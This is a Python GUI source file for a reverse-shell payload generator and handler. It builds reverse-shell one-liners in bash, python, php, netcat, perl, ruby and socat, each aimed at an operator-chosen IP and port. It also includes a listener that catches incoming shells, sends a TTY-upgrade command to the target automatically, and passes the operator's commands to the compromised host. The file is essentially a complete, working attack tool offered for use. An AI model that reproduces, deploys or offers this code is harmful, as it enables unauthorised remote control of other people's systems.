#!/usr/bin/python3
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import pyperclip
import socket
import threading
import re
import time
from datetime import datetime

class ReverseShellGenerator: 
    def __init__(self, root):
        self.root = root
        self.root.title("Reverse Shell generator & Handler")
        self.root.geometry("1100x850")
        self.root.configure(bg='#1e1e1e')
        
        self.listener_socket = None
        self.client_socket = None
        self.is_listening = False
        self.is_connected = False
        
        # Command History
        self.command_history = []
        self.history_index = -1
        
        self.setup_ui()
        self.generate_payload()

    def setup_ui(self):
        warning_frame = tk.Frame(self.root, bg='#ff4444', padx=10, pady=5)
        warning_frame.pack(fill='x', pady=(0, 10))
        tk.Label(warning_frame, text="⚠️ Multi-Payload generator & Handler ⚠️",
                 bg='#ff4444', fg='white', font=('Arial', 10, 'bold')).pack()
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.generator_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.listener_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.notebook.add(self.generator_tab, text="Payload Generator")
        self.notebook.add(self.listener_tab, text="Listener & Shell")
        
        self.setup_generator_tab()
        self.setup_listener_tab()

    def setup_generator_tab(self):
        main_frame = tk.Frame(self.generator_tab, bg='#1e1e1e')
        main_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        input_frame = tk.LabelFrame(main_frame, text="Network Configuration", bg='#2d2d2d', fg='white', font=('Arial', 11, 'bold'), padx=15, pady=15)
        input_frame.pack(fill='x', pady=(0, 10))
        
        tk.Label(input_frame, text="Your IP:", bg='#2d2d2d', fg='white').grid(row=0, column=0, sticky='w')
        self.ip_entry = tk.Entry(input_frame, width=30, font=('Courier', 10)); self.ip_entry.insert(0, "192.168.1.93")
        self.ip_entry.grid(row=0, column=1, padx=10, pady=5)
        
        tk.Label(input_frame, text="Port:", bg='#2d2d2d', fg='white').grid(row=1, column=0, sticky='w')
        self.port_entry = tk.Entry(input_frame, width=30, font=('Courier', 10)); self.port_entry.insert(0, "4444")
        self.port_entry.grid(row=1, column=1, padx=10, pady=5)
        
        self.shell_var = tk.StringVar(value="/bin/bash")
        tk.Label(input_frame, text="Target Shell:", bg='#2d2d2d', fg='white').grid(row=2, column=0, sticky='w')
        ttk.Combobox(input_frame, textvariable=self.shell_var, values=["/bin/bash", "/bin/sh", "/bin/zsh"], width=28).grid(row=2, column=1, padx=10, pady=5)
        
        payload_frame = tk.LabelFrame(main_frame, text="Payload Type", bg='#2d2d2d', fg='white', font=('Arial', 11, 'bold'), padx=15, pady=15)
        payload_frame.pack(fill='x', pady=(0, 10))
        self.payload_type = tk.StringVar(value="bash_tcp")
        
        p_types = [
            ("Bash TCP", "bash_tcp"), ("Bash UDP", "bash_udp"), ("Python", "python"),
            ("PHP", "php"), ("Netcat (-e)", "nc_e"), ("Netcat (FIFO)", "nc_mkfifo"),
            ("Perl", "perl"), ("Ruby", "ruby"), ("Socat", "socat")
        ]
        for i, (t, v) in enumerate(p_types):
            tk.Radiobutton(payload_frame, text=t, variable=self.payload_type, value=v, bg='#2d2d2d', fg='white', selectcolor='#1e1e1e', command=self.generate_payload).grid(row=i//3, column=i%3, sticky='w', padx=10)

        btn_frame = tk.Frame(main_frame, bg='#1e1e1e')
        btn_frame.pack(fill='x', pady=10)
        tk.Button(btn_frame, text="Generate & Sync", command=self.generate_payload, bg='#0d7377', fg='white', font=('Arial', 10, 'bold'), width=15).pack(side='left', padx=5)
        tk.Button(btn_frame, text="Copy Payload", command=self.copy_to_clipboard, bg='#14a085', fg='white', font=('Arial', 10, 'bold'), width=15).pack(side='left', padx=5)
        
        self.output_text = scrolledtext.ScrolledText(main_frame, bg='#1e1e1e', fg='#00ff00', font=('Courier', 10), height=10)
        self.output_text.pack(fill='both', expand=True, pady=10)

    def setup_listener_tab(self):
        main_frame = tk.Frame(self.listener_tab, bg='#1e1e1e')
        main_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        ctrl = tk.LabelFrame(main_frame, text="Listener Settings", bg='#2d2d2d', fg='white', font=('Arial', 11, 'bold'), padx=15, pady=15)
        ctrl.pack(fill='x', pady=(0, 10))
        
        tk.Label(ctrl, text="Listen IP:", bg='#2d2d2d', fg='white').grid(row=0, column=0)
        self.listen_ip_entry = tk.Entry(ctrl, width=15); self.listen_ip_entry.insert(0, "0.0.0.0")
        self.listen_ip_entry.grid(row=0, column=1, padx=5)
        
        tk.Label(ctrl, text="Port:", bg='#2d2d2d', fg='white').grid(row=0, column=2)
        self.listen_port_entry = tk.Entry(ctrl, width=8); self.listen_port_entry.insert(0, "4444")
        self.listen_port_entry.grid(row=0, column=3, padx=5)
        
        self.start_btn = tk.Button(ctrl, text="Start", command=self.start_listener, bg='#47d080', fg='white', font=('Arial', 10, 'bold'), width=10)
        self.start_btn.grid(row=0, column=4, padx=10)
        self.stop_btn = tk.Button(ctrl, text="Stop", command=self.stop_listener, bg='#c23616', fg='white', state='disabled', width=10)
        self.stop_btn.grid(row=0, column=5, padx=5)
        
        self.status_label = tk.Label(ctrl, text="Status: Idle", bg='#2d2d2d', fg='#ffaa00')
        self.status_label.grid(row=1, column=0, columnspan=6)

        mid = tk.Frame(main_frame, bg='#1e1e1e')
        mid.pack(fill='both', expand=True)
        self.shell_output = scrolledtext.ScrolledText(mid, bg='#0a0a0a', fg='#e0e0e0', font=('Consolas', 10), width=60)
        self.shell_output.pack(side='left', fill='both', expand=True)
        self.activity_log = scrolledtext.ScrolledText(mid, bg='#1a1a1a', fg='#ffaa00', font=('Arial', 9), width=35)
        self.activity_log.pack(side='right', fill='both')
        
        self.cmd_entry = tk.Entry(main_frame, bg='#1e1e1e', fg='#00ff00', font=('Consolas', 11), state='disabled')
        self.cmd_entry.pack(fill='x', pady=10)
        self.cmd_entry.bind('<Return>', lambda e: self.send_command())
        self.cmd_entry.bind('<Up>', self.navigate_history)

    def generate_payload(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        sh = self.shell_var.get()
        
        # --- THE FIX: Sync IP and Port to Listener Tab ---
        self.listen_ip_entry.delete(0, tk.END)
        self.listen_ip_entry.insert(0, ip)
        self.listen_port_entry.delete(0, tk.END)
        self.listen_port_entry.insert(0, port)
        
        payloads = {
            "bash_tcp": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "bash_udp": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
            "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{sh}\")'",
            "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{sh} <&3 >&3 2>&3\");'",
            "nc_e": f"nc {ip} {port} -e {sh}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {ip} {port} >/tmp/f",
            "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{sh} -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec(sprintf(\"{sh} -i <&%d >&%d 2>&&%d\",f,f,f))'",
            "socat": f"socat TCP:{ip}:{port} EXEC:{sh},pty,stderr,setsid,sigint,sane"
        }
        self.output_text.delete(1.0, tk.END)
        self.output_text.insert(tk.END, payloads.get(self.payload_type.get(), "Select a payload type..."))

    def log(self, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        self.activity_log.insert(tk.END, f"[{ts}] {msg}\n")
        self.activity_log.see(tk.END)

    def start_listener(self):
        ip = self.listen_ip_entry.get().strip()
        try:
            port = int(self.listen_port_entry.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Invalid Port Number")
            return
            
        self.is_listening = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        threading.Thread(target=self.listen_loop, args=(ip, port), daemon=True).start()

    def listen_loop(self, ip, port):
        try:
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.settimeout(1.0)
            try:
                self.listener_socket.bind((ip, port))
            except:
                self.log(f"⚠️ Cannot bind {ip}. Using 0.0.0.0...")
                self.listener_socket.bind(("0.0.0.0", port))
            
            self.listener_socket.listen(1)
            self.log(f"🎧 Listening on {port}...")
            
            while self.is_listening:
                try:
                    self.client_socket, addr = self.listener_socket.accept()
                    self.is_connected = True
                    self.status_label.config(text=f"Status: Connected to {addr[0]}", fg="#47d080")
                    self.log(f"✅ Target Connected: {addr[0]}")
                    self.cmd_entry.config(state='normal')
                    self.cmd_entry.focus()
                    self.trigger_multi_upgrade()
                    self.receive_data()
                    break
                except socket.timeout:
                    continue
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            self.stop_listener()

    def trigger_multi_upgrade(self):
        time.sleep(0.5)
        upgrade_cmd = (
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
            "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
            "/usr/bin/script -qc /bin/bash /dev/null\n"
        )
        self.client_socket.send(upgrade_cmd.encode())
        self.log("🚀 Chained TTY upgrade started...")

    def receive_data(self):
        def recv_thread():
            while self.is_connected:
                try:
                    data = self.client_socket.recv(4096)
                    if not data: break
                    raw = data.decode('utf-8', errors='replace')
                    
                    # Clean ANSI and Bracketed Paste Mode (keeps user@host clean)
                    clean = re.sub(r'\x1b\[\??[0-9;]*[a-zA-Z]', '', raw)
                    clean = re.sub(r'\x1b\].*?(\x07|\x1b\\)', '', clean)
                    
                    self.shell_output.insert(tk.END, clean)
                    self.shell_output.see(tk.END)
                except:
                    break
            self.log("🔌 Connection closed.")
            self.stop_listener()
        threading.Thread(target=recv_thread, daemon=True).start()

    def send_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd or not self.is_connected: return
        self.command_history.append(cmd)
        self.history_index = len(self.command_history)
        
        if cmd.lower() in ['clear', 'cls']:
            self.shell_output.delete(1.0, tk.END)
        else:
            self.client_socket.send((cmd + '\n').encode())
        self.cmd_entry.delete(0, tk.END)

    def navigate_history(self, event):
        if self.command_history:
            self.history_index = max(0, self.history_index - 1)
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.command_history[self.history_index])

    def copy_to_clipboard(self):
        pyperclip.copy(self.output_text.get(1.0, tk.END).strip())
        messagebox.showinfo("Success", "Payload Copied and synced to Listener!")

    def stop_listener(self):
        self.is_listening = self.is_connected = False
        if self.client_socket: self.client_socket.close()
        if self.listener_socket: self.listener_socket.close()
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.cmd_entry.config(state='disabled')
        self.status_label.config(text="Status: Idle", fg="#ffaa00")

if __name__ == "__main__":
    root = tk.Tk()
    app = ReverseShellGenerator(root)
    root.mainloop()